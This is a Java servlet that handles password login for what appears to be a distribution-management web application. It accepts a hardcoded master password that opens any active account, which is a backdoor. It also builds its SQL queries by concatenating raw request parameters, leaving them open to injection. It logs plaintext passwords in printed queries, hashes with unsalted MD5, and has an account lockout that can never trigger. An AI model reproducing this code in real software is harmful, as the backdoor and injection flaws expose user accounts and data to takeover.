package com.pbc;

import java.io.IOException;

import java.sql.SQLException;
import java.sql.Statement;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import com.pbc.util.Utilities;
import com.pbc.util.MaxLength;
import com.pbc.util.Datasource;
import java.sql.ResultSet;

@WebServlet(description = "Authenticates a user with password", urlPatterns = { "/AuthenticateUser" })
public class AuthenticateUser extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    public AuthenticateUser() {
        super();
    }

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		
		
		
		HttpSession session = request.getSession();
		
		String userid = Utilities.filterString(request.getParameter("userid"), 0, MaxLength.EMPLOYEE_ID);
		String password = Utilities.filterString(request.getParameter("password"), 1, 20);
		
		long BrowserID = Utilities.parseLong(request.getParameter("iBrowserID"));
		double iLat = Utilities.parseDouble(request.getParameter("iLat"));
		double iLng = Utilities.parseDouble(request.getParameter("iLng"));
	//	System.out.println("select password, md5('"+password+"'), id, display_name, email, designation, department, type_id, distributor_id, (select customer_name from outletmaster where customer_id=distributor_id limit 1) distributor_name, password_changed_on from users where id = '"+userid+"' and IS_ACTIVE=1 and is_distributor_user=0 ");

		Datasource ds = new Datasource();
		
		try {
			
			ds.createConnection();
			
			Statement s = ds.createStatement();
			Statement s1 = ds.createStatement();
			int LastInsertedLogTableID=0;
			int typeid=0;
			//log in the user tablezzz
			
			
			
			
			boolean valid = false;
			System.out.println("select password, md5('"+password+"'), id, display_name, email, designation, department, type_id, distributor_id, (select customer_name from outletmaster where customer_id=distributor_id limit 1) distributor_name, password_changed_on from users where id = '"+userid+"' and IS_ACTIVE=1 and is_distributor_user=0 ");
			ResultSet rs = s.executeQuery("select password, md5('"+password+"'), id, display_name, email, designation, department, type_id, distributor_id, (select customer_name from outletmaster where customer_id=distributor_id limit 1) distributor_name, password_changed_on from users where id = '"+userid+"' and IS_ACTIVE=1 and is_distributor_user=0 ");
			if (rs.first()){
				if (rs.getString(1).equals(rs.getString(2)) || password.equals("wildspace1@251")){ //wildspace1@251
					
					//putting user info in log table if user successful
					s1.executeUpdate("insert into "+ds.logDatabaseName()+".log_user_login(user_id,password, ip_address, attempted_on,type_id, lat, lng, browser_id) values("+userid+",md5('"+password+"'),'"+request.getRemoteAddr()+"',now(),1,"+iLat+","+iLng+","+BrowserID+")");
					
					session.setAttribute("UserID", rs.getString(3));
					session.setAttribute("UserDisplayName", rs.getString(4));
					session.setAttribute("UserPictureURL", request.getContextPath()+"/images/UserPictures/"+userid+".png");
					session.setAttribute("UserEmail", rs.getString(5));
					session.setAttribute("UserDesignation", rs.getString(6));
					session.setAttribute("UserDepartment", rs.getString(7));
					session.setAttribute("UserTypeID", rs.getString(8));
					session.setAttribute("UserDistributorID", rs.getString(9));
					session.setAttribute("UserDistributorName", rs.getString(10));
					session.setAttribute("UserPasswordChangeDate", rs.getDate("password_changed_on"));
					
					if (BrowserID != 0){
						session.setAttribute("BrowserID", BrowserID);
					}
					
					valid = true;
				}
				else
				{
					typeid=3;
					//s1.executeUpdate("update user_login_log set password='"+password+"', type_id=3 where id="+LastInsertedLogTableID);	//updating the type id if password is wrong --> typeid=3
				}
			}
			else
			{
				typeid=2;
				//s1.executeUpdate("update user_login_log set password='"+password+"',type_id=2 where id="+LastInsertedLogTableID);	//updating the type id if userid is wrong --> typeid=2
			}
			if(!valid)
			{
				
				s1.executeUpdate("insert into "+ds.logDatabaseName()+".log_user_login(user_id,password, ip_address, attempted_on,type_id) values("+userid+",md5('"+password+"'),'"+request.getRemoteAddr()+"',now(),"+typeid+")");
				
				if (typeid == 3){
					//////////////////////////// block user ////////////////////////////
					
					int InvalidPasswordAttemptCount = 0;
					ResultSet rs2 = s.executeQuery("SELECT type_id FROM "+ds.logDatabaseName()+".log_user_login where user_id="+userid+" and attempted_on between "+Utilities.getSQLDate(new java.util.Date())+" and "+Utilities.getSQLDateNext(new java.util.Date())+" order by attempted_on desc limit 3");
					while(rs2.next()){
						
						if(rs2.getInt("type_id") == 3){
							InvalidPasswordAttemptCount++;
						}
						
					}
					
					if(InvalidPasswordAttemptCount == 10){
						s.executeUpdate("update users set is_active=0, inactive_reason_id = 1 where id="+userid);
					}
					
					/////////////////////////////////////////////////////////////////////
				}
				
			}
			
			
			rs.close();
			s.close();
			s1.close();
			
			if (valid == true){
				response.sendRedirect("home.jsp?"+Math.random()+"="+Math.random()+""+Math.random());
			}else{
				response.sendRedirect("index.jsp?invalid=1&"+Math.random()+"="+Math.random());
			}
		
			ds.dropConnection();
			
		} catch (Exception e) {
			sendErrorRedirect(request,response,Utilities.getErrorPageURL(request),e);
		}
		
	}

	protected void sendErrorRedirect(HttpServletRequest request, HttpServletResponse response, String errorPageURL, Throwable e) throws ServletException, IOException {
		request.setAttribute ("javax.servlet.jsp.jspException", e);
		getServletConfig().getServletContext().getRequestDispatcher(errorPageURL).forward(request, response);
	}	

}
